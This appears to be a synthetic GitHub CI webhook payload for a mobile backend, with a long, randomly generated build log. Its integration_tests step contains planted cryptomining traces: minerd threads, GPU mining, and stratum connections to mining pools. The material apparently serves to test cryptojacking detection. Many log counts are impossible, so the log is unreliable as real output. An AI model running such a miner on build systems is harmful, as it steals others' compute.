{
  "action": "completed",
  "workflow_run": {
    "id": 935,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "1a7343985ae4d10851c22cc5c704900e91491289",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-04T12:47:57.540111Z",
    "updated_at": "2025-12-04T12:57:30.250182Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nArtifact uploaded: dist.zip (25MB)\nFetching submodules...\nTime: 89.638s\nTests: 456 passed, 90 total\nDone.\nNODE_ENV=development\nCompiling utils/service.java...\nnpm notice: created a lockfile\nImage pulled successfully\nPushing to registry...\nCoverage: 80% statements, 87% branches\nnpm install: added 275 packages\npip install: Successfully installed webpack-3.9\n[12:47:57] DEBUG: Connection pool: 4 active\nOptimizing 78 modules...\n[12:47:57] WARN: Deprecated API usage\nCache miss for key-3700\nFetching submodules...\nnpm install: resolved 1374 packages\n[12:47:57] INFO: Cache refreshed\nChecking out develop branch\nFinished.\nTests: 243 passed, 391 total\nUsing Node.js 20.19.2\nFinished.\nException: TypeError\n[12:47:57] DEBUG: Initializing service\nPlatform: win32-x64\nCache restored successfully (75MB)\n[12:47:57] ERROR: Connection failed\nLoading...\nSnapshots: 37 passed, 36 total\nStep 11/15: Installing dependencies\n[12:47:57] WARN: Deprecated API usage\nFetching from https://registry.npmjs.org/package.json\nStep 9/15: Deploying\nInstalling prettier@1.12.3\nCache hit for key-6382\nCompiling src/utils.go...\n[12:47:57] DEBUG: Initializing service\nBundling styles.css\nTime: 87.674s\nStep 14/23: Testing\nCoverage: 90% statements, 85% branches\nConnection established\n[12:47:57] WARN: Deprecated API usage\npip: Collecting webpack\nCache restored successfully (386MB)\nCompiling utils/service.java...\nPlatform: darwin-arm64\nCache hit for key-2944\nCache restored successfully (227MB)\nAlready up to date.\nPOST /upload - 200 (279ms)\nChecking out master branch\nLoading...\nUploading artifact 'dist' (29 files)\nWARNING: prettier has known vulnerabilities\nStep 10/18: Testing\nPulling image: python:latest\nCompiling src/app.ts...\nFetching from https://gcr.io/package.json\nPlatform: linux-x64\n\u2713 Step 'build' succeeded\nPlatform: darwin-arm64\nHEAD is now at ff5f7a9\n[12:47:57] DEBUG: Query executed in 44ms\nCache miss for key-8452\nStep 17/16: Installing dependencies\nWARNING: prettier has known vulnerabilities\nVerifying...\nStep 16/22: Deploying\nTLS handshake completed\nFetching submodules...\nnpm install: added 391 packages\nStep 17/19: Linting\nCache hit for key-2823\nSwitched to branch 'hotfix/task-651'\nyarn add: Done in 7.36s\nCompiling lib/index.js...\nProcessing...\nPulling image: node:18\nPOST /upload - 200 (214ms)\n[12:47:57] DEBUG: Initializing service\nnpm notice: package.json updated\n[12:47:57] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (31MB)\nPushing to registry...\nWaiting...\nBuilding Docker image...\n\u2713 All checks passed\nBundling runtime.css\nChecking out develop branch\n[12:47:57] DEBUG: Initializing service\nRan 41 tests in 4s\nOK\nFAILED: test_cache_hit\n[12:47:57] DEBUG: Connection pool: 11 active\nSuccess!\nVerifying...\nCompleted.\nVerifying...\nReady.\nStep 17/17: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 8/25: Running migrations\nWARNING: react has known vulnerabilities\nBundling runtime.js\nyarn add: Done in 5.42s\nCompiling utils/app.ts...\nSuccess!\nCompiling utils/main.py...\nnpm notice: package.json updated\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 2106ms\nFetching from https://gcr.io/package.json\nSwitched to branch 'feature/task-812'\nStep 9/21: Testing\nWARNING: webpack has known vulnerabilities\n[12:47:57] INFO: Connecting to database\nOK\nFetching submodules...\nLoading...\n\u2713 Step 'checkout' succeeded\nChecking out develop branch\npip: Installing build dependencies...\n[12:47:57] ERROR: Connection failed\nLoading...\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] DEBUG: Memory usage: 126MB\nCache saved successfully\npip: Installing build dependencies...\nUploading artifact 'dist' (39 files)\nFetching from https://googleapis.com/package.json\nCache restored successfully (416MB)\nLoading...\nnpm notice: package.json updated\n[12:47:57] INFO: Request completed\nTests: 59 passed, 223 total\nStep 8/23: Installing dependencies\nPushing to registry...\nSuccess!\n  PASS: integration/test_api_health.spec.js\nHEAD is now at 9b121bd\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 39 passed, 43 total\nArtifact uploaded: dist.zip (42MB)\nCreating production build...\nEnvironment: test\nStep 20/17: Installing dependencies\n  PASS: e2e/test_user_create.spec.js\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:57] DEBUG: Query executed in 53ms\nTime: 74.870s\n[12:47:57] WARN: Deprecated API usage\nArtifact downloaded: 21MB\nFetching submodules...\nFAILED: test_db_connect\nTime: 54.572s\nStep 7/15: Deploying\nCompiling src/index.js...\nHEAD is now at de28580\nnpm notice: package.json updated\nPulling image: python:latest\nnpm notice: package.json updated\n\u2713 Task completed in 1299ms\nBundling vendor.css\nCache miss for key-5700\nCreating production build...\nLayer 4/12: COPY command\nInstalling react@5.9.1\nPushing to registry...\nTime: 56.670s\nBuilding Docker image...\nOK\nPushing to registry...\nCompiling components/utils.go...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:57] INFO: Cache refreshed\n[12:47:57] DEBUG: Connection pool: 9 active\nEnvironment: development\nGET /status - 201 (23ms)\nCreating production build...\nWaiting...\nTests: 95 passed, 194 total\nCache invalidated: dependencies\nBuilding Docker image...\n[12:47:57] DEBUG: Loading configuration\nStep 1/18: Building\nCompiling utils/handler.rs...\nStep 18/20: Building\n[12:47:57] DEBUG: Loading configuration\nCoverage: 77% statements, 99% branches\npip: Collecting webpack\nCompiling src/service.java...\nPushing to registry...\nBundling runtime.css\npip install: Successfully installed prettier-2.1\nPulling image: alpine:latest\n[12:47:57] INFO: Request completed\n\u2713 Task completed in 3820ms\nGET /health - 204 (28ms)\nStep 13/16: Running migrations\n\u2713 Task completed in 4970ms\n=== Step type_check completed ===\n=== Step: checkout ===\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nCreating production build...\nUsing Node.js 19.14.8\n\u2713 Step 'build' succeeded\nPOST /upload - 200 (259ms)\nArtifact uploaded: build.tar.gz (26MB)\n[12:47:57] DEBUG: Loading configuration\nSnapshots: 47 passed, 31 total\nHEAD is now at 64b98ce\nTransforming 632 files...\nStep 8/22: Testing\nConnection established\n\u2713 All checks passed\n[12:47:57] WARN: Deprecated API usage\nNODE_ENV=production\nTransforming 374 files...\nCache restored successfully (206MB)\nOK\nCache restored successfully (187MB)\nAlready up to date.\npip: Installing build dependencies...\nTransforming 730 files...\nCoverage: 74% statements, 98% branches\nStep 16/24: Testing\nCache invalidated: node_modules\nnpm install: resolved 996 packages\n[12:47:57] INFO: Request completed\n  PASS: test_auth_login (77ms)\nnpm install: resolved 1379 packages\nPlatform: win32-x64\npip: Downloading lodash-1.19.tar.gz\n[12:47:57] DEBUG: Query executed in 31ms\nStep 8/19: Linting\nArtifact uploaded: dist.zip (99MB)\n\u2717 build failed with exit code 69\nGET /api - 200 (13ms)\nArtifact downloaded: 4MB\nCoverage: 78% statements, 91% branches\nTLS handshake completed\nArtifact downloaded: 29MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nCompiling lib/main.py...\nCompiling utils/handler.rs...\nStep 20/15: Linting\nLoading...\nArtifact downloaded: 38MB\nCoverage: 75% statements, 93% branches\n\u2713 Task completed in 1731ms\n[12:47:57] DEBUG: Memory usage: 1311MB\nStep 3/17: Testing\nWARNING: axios has known vulnerabilities\n[12:47:57] DEBUG: Memory usage: 1161MB\nStep 9/25: Testing\n\u2713 lint completed\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Starting build process\nnpm install: added 327 packages\nTLS handshake completed\nNODE_ENV=development\nChecking out develop branch\n[12:47:57] DEBUG: Initializing service\nStep 20/16: Linting\npip: Collecting jest\npip: Collecting webpack\n[12:47:57] DEBUG: Query executed in 72ms\n[12:47:57] DEBUG: Memory usage: 1632MB\nWaiting...\nTests: 281 passed, 213 total\n  PASS: test_user_create (189ms)\nStep 12/23: Deploying\nCompiling lib/main.py...\nBuilding Docker image...\nBundling vendor.js\nStep 6/23: Linting\nUploading artifact 'dist' (30 files)\nTime: 62.240s\n\u2713 build completed\nHEAD is now at 5f9207f\nOK\nWARNING: lodash has known vulnerabilities\nCache hit for key-9028\nUsing Node.js 20.6.7\nPlatform: linux-x64\nBundling runtime.js\nCompleted.\nBuilding Docker image...\nTransforming 865 files...\nnpm install: added 235 packages\n  PASS: unit/test_auth_login.spec.js\nProcessing...\nReady.\nnpm notice: package.json updated\nStep 13/16: Testing\nStep 3/24: Running migrations\npip: Collecting eslint\nUploading artifact 'build' (49 files)\nDone.\nTLS handshake completed\n\u2717 build failed with exit code 31\nCache saved successfully\nDone.\nPlatform: win32-x64\nPlatform: win32-x64\n  PASS: e2e/test_cache_hit.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:57] DEBUG: Loading configuration\n[12:47:57] DEBUG: Query executed in 51ms\nCache saved successfully\nTime: 24.485s\nStep 1/17: Building\nnpm install: added 455 packages\n\u2713 Task completed in 460ms\n[12:47:57] ERROR: Connection failed\n\u2713 Task completed in 3104ms\nRan 199 tests in 12s\nCache restored successfully (197MB)\n[12:47:57] DEBUG: Connection pool: 5 active\npip: Collecting jest\nInstalling axios@5.9.0\nSuccess!\nSnapshots: 11 passed, 11 total\nSuccess!\nCache restored successfully (336MB)\npip: Downloading webpack-5.9.tar.gz\n[12:47:57] INFO: Starting build process\n\u2717 build failed with exit code 83\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\n\u2713 Task completed in 708ms\nyarn add: Done in 26.87s\nImage pulled successfully\nPlatform: linux-x64\nStep 8/24: Building\nOK\nnpm install: resolved 578 packages\nChecking out develop branch\nCache saved successfully\n[12:47:57] INFO: Processing request\nPulling image: python:18\npip install: Successfully installed prettier-4.0\n\u2713 All checks passed\nException: ValueError\npip: Downloading axios-4.14.tar.gz\nEnvironment: development\nConnection established\nGenerating source maps...\nConnection established\nCache restored successfully (49MB)\nCache restored successfully (236MB)\nHEAD is now at d638730\nBuilding Docker image...\n  PASS: test_api_health (340ms)\nOptimizing 75 modules...\nHEAD is now at 682c6d9\npip: Installing build dependencies...\n  PASS: test_db_connect (259ms)\n\u2713 package completed\n[12:47:57] WARN: Deprecated API usage\nRan 18 tests in 10s\n[12:47:57] DEBUG: Connection pool: 9 active\n\u2713 Step 'checkout' succeeded\npip: Downloading express-5.2.tar.gz\nEnvironment: production\nStep 17/20: Installing dependencies\nSuccess!\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:57] WARN: Deprecated API usage\nGenerating source maps...\n[12:47:57] INFO: Connecting to database\nReady.\nStep 7/21: Linting\nWARNING: express has known vulnerabilities\n  PASS: test_auth_login (182ms)\nLoading...\nWARNING: jest has known vulnerabilities\nSwitched to branch 'bugfix/task-893'\nLayer 7/14: RUN command\n[12:47:57] WARN: Deprecated API usage\nArtifact downloaded: 16MB\nCompleted.\nDone.\n[12:47:57] DEBUG: Memory usage: 269MB\nArtifact uploaded: build.tar.gz (22MB)\nStep 7/22: Deploying\nTests: 422 passed, 362 total\nyarn add: Done in 1.54s\nInstalling prettier@1.2.9\n[12:47:57] DEBUG: Query executed in 19ms\n  PASS: unit/test_user_create.spec.js\nFinished.\n[12:47:57] INFO: Processing request\npip: Downloading jest-5.16.tar.gz\n[12:47:57] DEBUG: Memory usage: 1689MB\nFetching submodules...\nCompiling src/utils.go...\nUsing Python 3.11\nGenerating source maps...\nFetching from https://gcr.io/package.json\n[12:47:57] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:57] DEBUG: Memory usage: 1378MB\nCompleted.\nArtifact uploaded: build.tar.gz (29MB)\n[12:47:57] INFO: Connecting to database\nCache restored successfully (355MB)\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nyarn add: Done in 25.14s\nCoverage: 70% statements, 64% branches\nArtifact downloaded: 43MB\nStep 13/25: Building\n[12:47:57] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: e2e/test_auth_login.spec.js\nDone.\nnpm install: resolved 1416 packages\n[12:47:57] INFO: Starting build process\nStep 13/21: Linting\nUsing Node.js 16.11.1\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'dist' (49 files)\n\u2713 Step 'install' succeeded\nCache miss for key-7469\n[12:47:57] DEBUG: Memory usage: 1345MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 57 modules...\nTransforming 384 files...\nStep 5/16: Testing\nPulling image: node:18\n\u2713 Task completed in 3089ms\n[12:47:57] DEBUG: Connection pool: 2 active\n[12:47:57] DEBUG: Memory usage: 1402MB\nOptimizing 45 modules...\n[12:47:57] WARN: Deprecated API usage\nChecking out develop branch\nWaiting...\npip install: Successfully installed eslint-2.16\nGenerating source maps...\n  PASS: unit/test_auth_login.spec.js\n  PASS: unit/test_user_create.spec.js\nHEAD is now at 721ba47\nArtifact uploaded: build.tar.gz (2MB)\nPOST /api - 202 (441ms)\nNODE_ENV=development\n[12:47:57] INFO: Cache refreshed\nStep 9/16: Building\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /data - 201 (181ms)\nCache miss for key-5332\nNODE_ENV=production\npip: Downloading webpack-5.7.tar.gz\nCompiling components/app.ts...\nLayer 2/14: ENV command\n[12:47:57] DEBUG: Loading configuration\nTests: 144 passed, 133 total\n[12:47:57] INFO: Starting build process\nCache restored successfully (489MB)\nCache restored successfully (51MB)\nPOST /upload - 201 (172ms)\nWaiting...\nCompleted.\nTests: 90 passed, 297 total\nTLS handshake completed\nBuilding Docker image...\nWARNING: lodash has known vulnerabilities\nCompleted.\nReady.\nCompiling lib/service.java...\n[12:47:57] INFO: Cache refreshed\nUploading artifact 'dist' (6 files)\nEnvironment: production\n\u2713 package completed\nCache invalidated: node_modules\nFinished.\nCompiling utils/app.ts...\n\u2713 Task completed in 2497ms\nCompiling utils/app.ts...\nPlatform: darwin-arm64\nHEAD is now at c3f9ea9\nHEAD is now at e284cbc\nWARNING: prettier has known vulnerabilities\nCompiling lib/index.js...\nConnection established\nArtifact downloaded: 45MB\n[12:47:57] DEBUG: Memory usage: 1406MB\nTransforming 418 files...\nOptimizing 58 modules...\nReady.\nFetching from https://github.com/package.json\nCompleted.\nyarn add: Done in 14.22s\nReady.\n[12:47:57] ERROR: Connection failed\nAlready up to date.\nFetching submodules...\nTest Suites: 29 passed, 6 total\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Cache refreshed\nCreating production build...\nCache saved successfully\nTest Suites: 29 passed, 43 total\n[12:47:57] DEBUG: Initializing service\nException: ValueError\nnpm install: added 398 packages\nUsing Node.js 15.2.9\nTests: 374 passed, 365 total\nProcessing...\npip install: Successfully installed webpack-5.8\nEnvironment: production\nUsing Python 3.12\nPOST /data - 202 (10ms)\npip: Downloading jest-5.16.tar.gz\nWaiting...\nGET /health - 201 (93ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: test\nAlready up to date.\nnpm notice: package.json updated\nVerifying...\n[12:47:57] INFO: Starting build process\nArtifact uploaded: dist.zip (84MB)\nWaiting...\nCache saved successfully\nSuccess!\nnpm notice: package.json updated\n\u2713 Step 'checkout' succeeded\nException: NullPointerException\nCompiling utils/main.py...\nSuccess!\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\nException: RuntimeError\nVerifying...\nStep 15/25: Installing dependencies\nTime: 54.28s\nHEAD is now at cc8762b\nStep 3/25: Testing\nFetching from https://docker.io/package.json\nArtifact uploaded: dist.zip (45MB)\nyarn add: Done in 6.46s\nnpm notice: package.json updated\nFinished.\nFinished.\nCache saved successfully\nnpm install: added 435 packages\nCreating production build...\nSwitched to branch 'bugfix/task-943'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 6 passed, 43 total\nArtifact uploaded: dist.zip (100MB)\nConnection established\nCreating production build...\nSnapshots: 6 passed, 33 total\npip: Collecting jest\n[12:47:57] INFO: Connecting to database\nStep 19/17: Deploying\nTest Suites: 29 passed, 38 total\nImage pulled successfully\nnpm notice: created a lockfile\n\u2717 build failed with exit code 46\nWaiting...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /api - 204 (11ms)\nnpm notice: package.json updated\nFAILED: test_cache_hit\nTime: 118.508s\nnpm install: resolved 1166 packages\nUploading artifact 'coverage' (17 files)\n[12:47:57] DEBUG: Memory usage: 1972MB\nCache invalidated: dependencies\nTests: 271 passed, 413 total\n  PASS: e2e/test_cache_hit.spec.js\nGET /status - 200 (73ms)\nCache restored successfully (416MB)\nCompiling utils/handler.rs...\nFAILED: test_cache_hit\n\u2713 Step 'setup' succeeded\nMinifying app.js\n  PASS: test_cache_hit (13ms)\nUsing Python 3.11\nUsing Python 3.11\n[12:47:57] DEBUG: Memory usage: 794MB\nUploading artifact 'dist' (34 files)\n\u2713 All checks passed\nArtifact downloaded: 23MB\nStep 10/25: Linting\nTest Suites: 18 passed, 14 total\nOK\nSnapshots: 22 passed, 31 total\nGenerating source maps...\nEnvironment: test\nCompleted.\nAlready up to date.\nPushing to registry...\npip: Downloading lodash-3.7.tar.gz\n[12:47:57] DEBUG: Memory usage: 1550MB\npip: Downloading eslint-3.3.tar.gz\nyarn add: Done in 19.81s\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache restored successfully (471MB)\nStep 6/21: Installing dependencies\nFetching from https://googleapis.com/package.json\npip: Collecting express\n[12:47:57] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: react has known vulnerabilities\nSwitched to branch 'bugfix/task-847'\nCompiling lib/utils.go...\n[12:47:57] INFO: Request completed\nBundling styles.js\nVerifying...\nOptimizing 78 modules...\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\nConnection established\nStep 1/22: Deploying\nAccepted share #464\nPushing to registry...\nArtifact uploaded: dist.zip (75MB)\nSwitched to branch 'bugfix/task-200'\nOK\n  PASS: test_db_connect (488ms)\nnpm install: added 131 packages\nCompleted.\nProcessing...\nOK\n  PASS: e2e/test_user_create.spec.js\n\u2713 test completed\npip install: Successfully installed webpack-3.9\nLayer 3/8: RUN command\nStep 6/18: Deploying\npip: Collecting jest\npip install: Successfully installed axios-4.5\nCache invalidated: node_modules\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] DEBUG: Initializing service\n[12:47:57] DEBUG: Connection pool: 3 active\nyarn add: Done in 4.21s\n\u2713 Step 'install' succeeded\nStep 19/25: Running migrations\nHEAD is now at c363fda\nminerd: 15 threads active\nStep 10/22: Testing\n\u2713 All checks passed\nWaiting...\nSwitched to branch 'bugfix/task-601'\nFinished.\nGPU #1: 76\u00b0C, mining\nStep 3/19: Testing\nCompiling lib/main.py...\n[12:47:57] INFO: Cache refreshed\nInstalling react@2.19.9\nCompiling utils/app.ts...\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\n\u2717 build failed with exit code 86\nFetching from https://googleapis.com/package.json\nCoverage: 93% statements, 67% branches\nFinished.\n\u2717 build failed with exit code 19\nCache restored successfully (172MB)\n[12:47:57] INFO: Request completed\nReady.\nCache saved successfully\n[12:47:57] DEBUG: Connection pool: 19 active\nAlready up to date.\nPOST /upload - 201 (245ms)\nPulling image: alpine:18\nCompiling components/utils.go...\nBundling vendor.js\nCache hit for key-1437\n[12:47:57] DEBUG: Connection pool: 5 active\nAccepted share #142\nLoading...\n[12:47:57] INFO: Request completed\nnpm install: resolved 339 packages\nArtifact uploaded: build.tar.gz (38MB)\nRan 136 tests in 55s\nyarn add: Done in 21.0s\n[12:47:57] INFO: Connecting to database\nWaiting...\nCache miss for key-2693\nArtifact uploaded: build.tar.gz (16MB)\nInstalling webpack@4.17.8\nAccepted share #371\n[12:47:57] ERROR: Connection failed\nSnapshots: 37 passed, 34 total\nSuccess!\nDone.\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nCoverage: 76% statements, 67% branches\n[12:47:57] WARN: Deprecated API usage\nRan 44 tests in 34s\nTest Suites: 5 passed, 34 total\n[12:47:57] DEBUG: Initializing service\nProcessing...\n[12:47:57] DEBUG: Memory usage: 795MB\nUsing Node.js 16.11.8\ncryptonight: Hashrate: 3841 H/s\n[12:47:57] DEBUG: Connection pool: 19 active\nBundling main.css\nArtifact uploaded: build.tar.gz (50MB)\nPushing to registry...\n  PASS: test_user_create (146ms)\npip install: Successfully installed webpack-5.1\nWARNING: prettier has known vulnerabilities\nLoading...\nProcessing...\n[12:47:57] DEBUG: Initializing service\nUsing Node.js 15.0.0\nHEAD is now at 13aa895\n[12:47:57] ERROR: Connection failed\nBundling runtime.js\n[12:47:57] DEBUG: Memory usage: 1937MB\nCompiling lib/utils.go...\npip install: Successfully installed lodash-2.11\nUsing Python 3.10\nOptimizing 60 modules...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\n\u2713 All checks passed\nWaiting...\nHEAD is now at 606d3c1\nCache invalidated: build\n[12:47:57] INFO: Starting build process\nTLS handshake completed\npip: Downloading jest-1.10.tar.gz\nTest Suites: 44 passed, 43 total\npip: Collecting react\nPlatform: darwin-arm64\npip: Downloading axios-1.8.tar.gz\npip install: Successfully installed webpack-2.4\nFetching from https://githubusercontent.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /api - 201 (62ms)\nTime: 22.774s\nLayer 10/9: COPY command\nStep 6/17: Deploying\nRan 86 tests in 40s\nProcessing...\n[12:47:57] DEBUG: Query executed in 21ms\n[12:47:57] INFO: Cache refreshed\nStep 15/21: Installing dependencies\nOptimizing 17 modules...\nCache saved successfully\n[12:47:57] INFO: Connecting to database\nInstalling express@4.0.6\nConnecting to stratum+tcp://mine.malicious-pool.xyz:3333\nStep 15/23: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\npip: Installing build dependencies...\nNODE_ENV=production\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Starting build process\nCompleted.\nTime: 78.73s\n[12:47:57] INFO: Connecting to database\nChecking out develop branch\n[12:47:57] DEBUG: Initializing service\nBuilding Docker image...\npip: Collecting axios\n[12:47:57] DEBUG: Loading configuration\nFinished.\nStep 3/15: Building\nArtifact uploaded: build.tar.gz (9MB)\nnpm install: added 284 packages\nArtifact uploaded: dist.zip (82MB)\nGenerating source maps...\nHEAD is now at 5c647ca\nBuilding Docker image...\nAlready up to date.\n[12:47:57] INFO: Starting build process\nCreating production build...\n[12:47:57] WARN: Deprecated API usage\npip: Collecting webpack\nProcessing...\n[12:47:57] INFO: Starting build process\nFinished.\nBundling vendor.js\nGPU #0: 66\u00b0C, mining\nArtifact downloaded: 50MB\nWARNING: jest has known vulnerabilities\npip: Collecting prettier\nStep 1/23: Running migrations\n[12:47:57] INFO: Request completed\nVerifying...\nVerifying...\nnpm notice: package.json updated\nImage pulled successfully\nProcessing...\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPOST /api - 201 (75ms)\n[12:47:57] DEBUG: Loading configuration\nTransforming 171 files...\n[12:47:57] INFO: Request completed\nBuilding Docker image...\n[12:47:57] DEBUG: Initializing service\nStep 14/16: Testing\nArtifact uploaded: dist.zip (35MB)\nTime: 25.968s\nCoverage: 100% statements, 92% branches\nUploading artifact 'dist' (28 files)\nTest Suites: 39 passed, 42 total\nLayer 9/11: RUN command\nUsing Python 3.9\n[12:47:57] WARN: Deprecated API usage\nGET /api - 200 (51ms)\nCache restored successfully (142MB)\nminerd: 11 threads active\nUsing Python 3.10\nMinifying app.js\n  PASS: unit/test_auth_login.spec.js\nWaiting...\npip: Downloading axios-4.5.tar.gz\nInstalling lodash@1.19.10\nPOST /data - 202 (17ms)\nConnection established\nTests: 244 passed, 277 total\nArtifact downloaded: 13MB\nTLS handshake completed\nArtifact downloaded: 36MB\nCache miss for key-4646\nCompiling lib/app.ts...\nWARNING: express has known vulnerabilities\n[12:47:57] DEBUG: Connection pool: 7 active\nDone.\nImage pulled successfully\nCompiling components/service.java...\nStep 16/24: Testing\nEnvironment: development\n[12:47:57] ERROR: Connection failed\nInstalling axios@4.11.1\n=== Step integration_tests completed ===\n=== Step: setup_environment ===\n[12:47:57] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nArtifact downloaded: 16MB\n[12:47:57] INFO: Cache refreshed\npip: Collecting lodash\n\u2717 build failed with exit code 38\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed webpack-4.2\nDone.\nPulling image: node:3.11\nGenerating source maps...\nOptimizing 23 modules...\nCache restored successfully (22MB)\n[12:47:57] INFO: Starting build process\n[12:47:57] WARN: Deprecated API usage\nOptimizing 55 modules...\nDone.\nCache invalidated: node_modules\nLayer 1/12: ENV command\nCompiling src/main.py...\nInstalling eslint@5.12.5\nAlready up to date.\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: dist.zip (99MB)\n  PASS: test_cache_hit (165ms)\nStep 17/15: Running migrations\nWaiting...\nBuilding Docker image...\nnpm notice: package.json updated\n[12:47:57] DEBUG: Initializing service\n\u2717 build failed with exit code 4\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 1946ms\nLayer 7/13: COPY command\nPlatform: win32-x64\nDone.\nDone.\nNODE_ENV=test\n[12:47:57] DEBUG: Connection pool: 8 active\nCompiling lib/service.java...\nOptimizing 36 modules...\nInstalling prettier@4.9.2\nPushing to registry...\nPlatform: darwin-arm64\nMinifying main.js\n[12:47:57] INFO: Request completed\nTransforming 474 files...\nnpm notice: package.json updated\nCompiling src/index.js...\nWaiting...\nCompiling src/service.java...\nCache invalidated: dependencies\nBuilding Docker image...\nTest Suites: 45 passed, 21 total\npip: Downloading eslint-2.19.tar.gz\nCompiling components/index.js...\nPOST /upload - 200 (99ms)\n\u2713 Task completed in 708ms\nPlatform: darwin-arm64\nChecking out main branch\nnpm notice: created a lockfile\nPlatform: linux-x64\n[12:47:57] INFO: Starting build process\nSwitched to branch 'hotfix/task-881'\nHEAD is now at 245f02b\n[12:47:57] INFO: Cache refreshed\nArtifact downloaded: 1MB\nPushing to registry...\nSnapshots: 39 passed, 37 total\nUploading artifact 'coverage' (31 files)\nWARNING: jest has known vulnerabilities\nCompiling src/handler.rs...\nFinished.\nLoading...\n  PASS: test_cache_hit (426ms)\nOK\npip: Collecting webpack\nTransforming 152 files...\nNODE_ENV=test\n  PASS: unit/test_cache_hit.spec.js\n\u2713 Step 'install' succeeded\nFetching from https://githubusercontent.com/package.json\nCache miss for key-4277\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at 4bb25ea\nStep 8/15: Testing\nCache hit for key-8735\nProcessing...\n[12:47:57] INFO: Processing request\nRan 186 tests in 2s\nCache invalidated: node_modules\n[12:47:57] DEBUG: Memory usage: 1320MB\nLoading...\nLayer 5/12: RUN command\nArtifact uploaded: dist.zip (25MB)\nCache hit for key-5995\n[12:47:57] DEBUG: Loading configuration\nnpm install: added 160 packages\nCache invalidated: build\nLayer 7/10: RUN command\nLayer 7/15: RUN command\n[12:47:57] INFO: Request completed\nBundling vendor.css\nFAILED: test_db_connect\nImage pulled successfully\n[12:47:57] INFO: Starting build process\n[12:47:57] WARN: Deprecated API usage\nMinifying main.js\nLayer 4/12: RUN command\n[12:47:57] DEBUG: Initializing service\nBuilding Docker image...\nHEAD is now at 515b1d9\n\u2717 build failed with exit code 91\nBuilding Docker image...\nGET /api - 204 (43ms)\nBuilding Docker image...\nFetching from https://github.com/package.json\nWaiting...\nStep 8/19: Installing dependencies\n[12:47:57] DEBUG: Query executed in 59ms\n\u2717 build failed with exit code 67\n[12:47:57] INFO: Starting build process\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Connecting to database\nCreating production build...\nCompiling utils/main.py...\n[12:47:57] INFO: Starting build process\n\u2713 Step 'setup' succeeded\n  PASS: e2e/test_cache_hit.spec.js\nFetching submodules...\nLoading...\nTLS handshake completed\n[12:47:57] INFO: Request completed\nFAILED: test_db_connect\n[12:47:57] DEBUG: Query executed in 19ms\n\u2713 Step 'test' succeeded\nBundling runtime.js\nAlready up to date.\nUploading artifact 'dist' (10 files)\nHEAD is now at 32978d1\nCoverage: 93% statements, 67% branches\n[12:47:57] DEBUG: Loading configuration\nUsing Node.js 14.8.10\nCompiling src/index.js...\nTransforming 223 files...\nBundling main.css\n  PASS: test_cache_hit (125ms)\nPushing to registry...\nStep 4/16: Deploying\nCoverage: 91% statements, 100% branches\nCoverage: 86% statements, 95% branches\nCompiling components/index.js...\nSwitched to branch 'hotfix/task-118'\nBundling vendor.js\nUsing Node.js 16.12.3\n[12:47:57] DEBUG: Loading configuration\n[12:47:57] DEBUG: Connection pool: 11 active\nStep 12/18: Installing dependencies\nLoading...\nArtifact uploaded: build.tar.gz (6MB)\nEnvironment: development\nUploading artifact 'coverage' (12 files)\nOK\nnpm notice: package.json updated\n\u2713 Task completed in 657ms\nTest Suites: 11 passed, 13 total\nCache invalidated: node_modules\nImage pulled successfully\nPlatform: win32-x64\npip: 